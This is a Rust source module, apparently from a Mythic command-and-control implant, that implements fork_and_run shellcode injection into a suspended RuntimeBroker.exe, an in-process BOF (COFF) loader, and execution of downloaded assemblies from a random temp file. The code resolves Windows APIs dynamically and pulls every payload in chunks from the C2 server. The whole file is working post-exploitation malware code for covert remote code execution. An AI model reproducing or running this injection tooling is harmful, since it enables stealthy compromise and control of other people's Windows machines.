use crate::{AgentTask, ContinuedData, mythic_success, mythic_error};
use base64::{Engine as _, engine::general_purpose};
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::error::Error;
use std::result::Result;
use std::sync::mpsc;

const CHUNK_SIZE: usize = 512000;
const MAX_OUTPUT: usize = 5 * 1024 * 1024; // 5MB cap

#[derive(Serialize, Deserialize, Debug)]
pub struct ExecuteAssemblyArgs {
    #[serde(rename = "assembly-file-id")]
    pub assembly_file_id: Option<String>,
    pub arguments: Option<String>,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct BofArgs {
    #[serde(rename = "bof-file-id")]
    pub bof_file_id: Option<String>,
    pub arguments: Option<String>,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct ForkRunArgs {
    #[serde(rename = "shellcode-file-id")]
    pub shellcode_file_id: Option<String>,
    #[serde(default = "default_spawnto")]
    pub spawnto: String,
    #[serde(default = "default_timeout")]
    pub timeout: u32,
}

fn default_spawnto() -> String { "C:\\Windows\\System32\\RuntimeBroker.exe".to_string() }
fn default_timeout() -> u32 { 30 }

fn download_file_chunks(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: &mpsc::Receiver<serde_json::Value>,
    file_id: &str,
    task_id: &str,
) -> Result<Vec<u8>, Box<dyn Error>> {
    tx.send(json!({
        "upload": json!({ "chunk_size": CHUNK_SIZE, "file_id": file_id, "chunk_num": 1 }),
        "task_id": task_id,
    }))?;

    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let continued: ContinuedData = serde_json::from_str(&task.parameters)?;
    let mut data: Vec<u8> = general_purpose::STANDARD.decode(continued.chunk_data.unwrap())?;
    let total = continued.total_chunks.unwrap();

    for chunk_num in 2..=total {
        tx.send(json!({
            "upload": json!({ "chunk_size": CHUNK_SIZE, "file_id": file_id, "chunk_num": chunk_num }),
            "task_id": task_id,
        }))?;
        let task: AgentTask = serde_json::from_value(rx.recv()?)?;
        let continued: ContinuedData = serde_json::from_str(&task.parameters)?;
        data.append(&mut general_purpose::STANDARD.decode(continued.chunk_data.unwrap())?);
    }
    Ok(data)
}

// ============================================================================
// FORK AND RUN — Sacrificial process pattern
// ============================================================================

#[cfg(target_os = "windows")]
unsafe fn fork_and_run_impl(shellcode: &[u8], spawnto: &str, timeout_ms: u32) -> Result<String, String> {
    use std::ptr;
    use std::ffi::c_void;

    type CreatePipeFn = unsafe extern "system" fn(*mut *mut c_void, *mut *mut c_void, *mut SecurityAttributes, u32) -> i32;
    type CreateProcessAFn = unsafe extern "system" fn(*const u8, *mut u8, *mut c_void, *mut c_void, i32, u32, *mut c_void, *const u8, *mut StartupInfoA, *mut ProcessInformation) -> i32;
    type VirtualAllocExFn = unsafe extern "system" fn(*mut c_void, *mut c_void, usize, u32, u32) -> *mut c_void;
    type WriteProcessMemoryFn = unsafe extern "system" fn(*mut c_void, *mut c_void, *const u8, usize, *mut usize) -> i32;
    type VirtualProtectExFn = unsafe extern "system" fn(*mut c_void, *mut c_void, usize, u32, *mut u32) -> i32;
    type CreateRemoteThreadFn = unsafe extern "system" fn(*mut c_void, *mut c_void, usize, Option<unsafe extern "system" fn(*mut c_void) -> u32>, *mut c_void, u32, *mut u32) -> *mut c_void;
    type ResumeThreadFn = unsafe extern "system" fn(*mut c_void) -> u32;
    type ReadFileFn = unsafe extern "system" fn(*mut c_void, *mut u8, u32, *mut u32, *mut c_void) -> i32;
    type WaitForSingleObjectFn = unsafe extern "system" fn(*mut c_void, u32) -> u32;
    type TerminateProcessFn = unsafe extern "system" fn(*mut c_void, u32) -> i32;
    type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;

    #[repr(C)]
    struct SecurityAttributes {
        length: u32,
        security_descriptor: *mut c_void,
        inherit_handle: i32,
    }

    #[repr(C)]
    #[derive(Default)]
    struct StartupInfoA {
        cb: u32,
        reserved: *mut u8,
        desktop: *mut u8,
        title: *mut u8,
        x: u32, y: u32, x_size: u32, y_size: u32,
        x_count_chars: u32, y_count_chars: u32,
        fill_attribute: u32,
        flags: u32,
        show_window: u16,
        cb_reserved2: u16,
        lp_reserved2: *mut u8,
        std_input: *mut c_void,
        std_output: *mut c_void,
        std_error: *mut c_void,
    }

    #[repr(C)]
    #[derive(Default)]
    struct ProcessInformation {
        process: *mut c_void,
        thread: *mut c_void,
        process_id: u32,
        thread_id: u32,
    }

    // Resolve APIs
    let create_pipe: CreatePipeFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "CreatePipe").ok_or("CreatePipe")?);
    let create_process: CreateProcessAFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "CreateProcessA").ok_or("CreateProcessA")?);
    let virtual_alloc_ex: VirtualAllocExFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "VirtualAllocEx").ok_or("VirtualAllocEx")?);
    let write_process_memory: WriteProcessMemoryFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "WriteProcessMemory").ok_or("WriteProcessMemory")?);
    let virtual_protect_ex: VirtualProtectExFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "VirtualProtectEx").ok_or("VirtualProtectEx")?);
    let create_remote_thread: CreateRemoteThreadFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "CreateRemoteThread").ok_or("CreateRemoteThread")?);
    let resume_thread: ResumeThreadFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "ResumeThread").ok_or("ResumeThread")?);
    let read_file: ReadFileFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "ReadFile").ok_or("ReadFile")?);
    let wait_for_single_object: WaitForSingleObjectFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "WaitForSingleObject").ok_or("WaitForSingleObject")?);
    let terminate_process: TerminateProcessFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "TerminateProcess").ok_or("TerminateProcess")?);
    let close_handle: CloseHandleFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "CloseHandle").ok_or("CloseHandle")?);

    // 1. Create pipe for stdout capture
    let mut sa = SecurityAttributes { length: std::mem::size_of::<SecurityAttributes>() as u32, security_descriptor: ptr::null_mut(), inherit_handle: 1 };
    let mut read_pipe: *mut c_void = ptr::null_mut();
    let mut write_pipe: *mut c_void = ptr::null_mut();

    if create_pipe(&mut read_pipe, &mut write_pipe, &mut sa, 0) == 0 {
        return Err("CreatePipe failed".to_string());
    }

    // 2. Create suspended process
    let spawnto_c = std::ffi::CString::new(spawnto).map_err(|_| "Invalid spawnto path")?;
    let mut si: StartupInfoA = std::mem::zeroed();
    si.cb = std::mem::size_of::<StartupInfoA>() as u32;
    si.flags = 0x100; // STARTF_USESTDHANDLES
    si.std_output = write_pipe;
    si.std_error = write_pipe;
    si.std_input = ptr::null_mut();

    let mut pi: ProcessInformation = std::mem::zeroed();
    let create_flags: u32 = 0x04 | 0x08000000; // CREATE_SUSPENDED | CREATE_NO_WINDOW

    let result = create_process(
        spawnto_c.as_ptr() as *const u8,
        ptr::null_mut(),
        ptr::null_mut(),
        ptr::null_mut(),
        1, // inherit handles
        create_flags,
        ptr::null_mut(),
        ptr::null(),
        &mut si,
        &mut pi,
    );

    if result == 0 {
        close_handle(read_pipe);
        close_handle(write_pipe);
        return Err("CreateProcess failed".to_string());
    }

    // 3. Allocate + write + protect in child
    let remote_mem = virtual_alloc_ex(pi.process, ptr::null_mut(), shellcode.len(), 0x3000, 0x04); // MEM_COMMIT|RESERVE, PAGE_READWRITE
    if remote_mem.is_null() {
        terminate_process(pi.process, 1);
        close_handle(pi.process);
        close_handle(pi.thread);
        close_handle(read_pipe);
        close_handle(write_pipe);
        return Err("VirtualAllocEx failed in child".to_string());
    }

    let mut written: usize = 0;
    write_process_memory(pi.process, remote_mem, shellcode.as_ptr(), shellcode.len(), &mut written);

    let mut old_protect: u32 = 0;
    virtual_protect_ex(pi.process, remote_mem, shellcode.len(), 0x20, &mut old_protect); // PAGE_EXECUTE_READ

    // 4. Create remote thread in child to execute shellcode + close write pipe
    let mut remote_tid: u32 = 0;
    let remote_thread = create_remote_thread(
        pi.process,
        ptr::null_mut(),
        0,
        Some(std::mem::transmute(remote_mem)),
        ptr::null_mut(),
        0,
        &mut remote_tid,
    );

    // Resume the main thread (needed for process to initialize)
    resume_thread(pi.thread);

    // Close parent's write end of pipe — ReadFile will get EOF when child exits
    close_handle(write_pipe);

    if remote_thread.is_null() {
        // Thread creation failed — still try to read any output
    } else {
        close_handle(remote_thread);
    }

    // 5. Read stdout from pipe (blocks until child closes its end / dies)
    let mut output = Vec::new();
    let mut buf = [0u8; 4096];
    loop {
        let mut bytes_read: u32 = 0;
        let ok = read_file(read_pipe, buf.as_mut_ptr(), buf.len() as u32, &mut bytes_read, ptr::null_mut());
        if ok == 0 || bytes_read == 0 {
            break;
        }
        output.extend_from_slice(&buf[..bytes_read as usize]);
        if output.len() >= MAX_OUTPUT {
            break;
        }
    }

    // 6. Wait for child with timeout
    let wait_result = wait_for_single_object(pi.process, timeout_ms * 1000);
    if wait_result == 0x102 { // WAIT_TIMEOUT
        terminate_process(pi.process, 1);
    }

    // Cleanup
    close_handle(pi.process);
    close_handle(pi.thread);
    close_handle(read_pipe);

    let output_str = String::from_utf8_lossy(&output).to_string();
    if output_str.is_empty() {
        Ok("Executed (no output captured)".to_string())
    } else {
        Ok(output_str)
    }
}

// ============================================================================
// FORK_AND_RUN COMMAND — shellcode in sacrificial process
// ============================================================================

#[cfg(target_os = "windows")]
pub fn fork_and_run(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let args: ForkRunArgs = serde_json::from_str(&task.parameters)?;
    let file_id = args.shellcode_file_id.ok_or("No shellcode file ID")?;

    let shellcode = download_file_chunks(tx, &rx, &file_id, &task.id)?;
    if shellcode.is_empty() {
        return Err("Shellcode is empty".into());
    }

    let sc_size = shellcode.len();
    let result = unsafe { fork_and_run_impl(&shellcode, &args.spawnto, args.timeout) };

    match result {
        Ok(output) => tx.send(mythic_success!(task.id, format!("fork_and_run ({} bytes → {})\n\n{}", sc_size, args.spawnto, output)))?,
        Err(e) => tx.send(mythic_error!(task.id, format!("fork_and_run failed: {}", e)))?,
    }
    Ok(())
}

#[cfg(not(target_os = "windows"))]
pub fn fork_and_run(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    tx.send(mythic_error!(task.id, "fork_and_run requires Windows"))?;
    Ok(())
}

// ============================================================================
// BOF COMMAND — in-process COFF loader with BeaconAPI
// ============================================================================

#[cfg(target_os = "windows")]
pub fn bof(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let args: BofArgs = serde_json::from_str(&task.parameters)?;
    let file_id = args.bof_file_id.ok_or("No BOF file ID")?;
    let arguments = args.arguments.unwrap_or_default();

    let file_data = download_file_chunks(tx, &rx, &file_id, &task.id)?;
    if file_data.is_empty() {
        return Err("BOF file is empty".into());
    }

    let bof_size = file_data.len();

    // Execute via in-process COFF loader with BeaconAPI support
    let result = crate::coffloader::run_bof(&file_data, arguments.as_bytes());

    match result {
        Ok(output) => tx.send(mythic_success!(task.id, format!(
            "BOF executed ({} bytes)\n\n{}",
            bof_size, output
        )))?,
        Err(e) => tx.send(mythic_error!(task.id, format!("BOF execution failed: {}", e)))?,
    }
    Ok(())
}

#[cfg(not(target_os = "windows"))]
pub fn bof(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    tx.send(mythic_error!(task.id, "bof requires Windows"))?;
    Ok(())
}

// ============================================================================
// EXECUTE_ASSEMBLY — unchanged
// ============================================================================

#[cfg(target_os = "windows")]
pub fn execute_assembly(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let args: ExecuteAssemblyArgs = serde_json::from_str(&task.parameters)?;
    let file_id = args.assembly_file_id.ok_or("No assembly file ID")?;
    let arguments = args.arguments.unwrap_or_default();

    let file_data = download_file_chunks(tx, &rx, &file_id, &task.id)?;
    if file_data.is_empty() {
        return Err("Assembly file is empty".into());
    }

    let temp_dir = std::env::temp_dir();
    let rand_name: String = (0..8).map(|_| (b'a' + (rand::random::<u8>() % 26)) as char).collect();
    let asm_path = temp_dir.join(&rand_name);
    std::fs::write(&asm_path, &file_data)?;

    let asm_path_str = asm_path.to_string_lossy().to_string();

    let output = std::process::Command::new("dotnet")
        .arg(&asm_path_str)
        .args(arguments.split_whitespace())
        .output();

    let result = match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);
            if stderr.is_empty() {
                format!("Executed ({} bytes)\n\n{}", file_data.len(), stdout.trim())
            } else {
                format!("Executed ({} bytes)\n\nOutput:\n{}\n\nErrors:\n{}", file_data.len(), stdout.trim(), stderr.trim())
            }
        }
        Err(_) => {
            match std::process::Command::new(&asm_path_str).args(arguments.split_whitespace()).output() {
                Ok(out) => {
                    let stdout = String::from_utf8_lossy(&out.stdout);
                    format!("Executed ({} bytes)\n\n{}", file_data.len(), stdout.trim())
                }
                Err(e) => format!("Execution failed: {}", e),
            }
        }
    };

    let _ = std::fs::remove_file(&asm_path);
    tx.send(mythic_success!(task.id, result))?;
    Ok(())
}

#[cfg(not(target_os = "windows"))]
pub fn execute_assembly(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    tx.send(mythic_error!(task.id, "execute_assembly requires Windows"))?;
    Ok(())
}
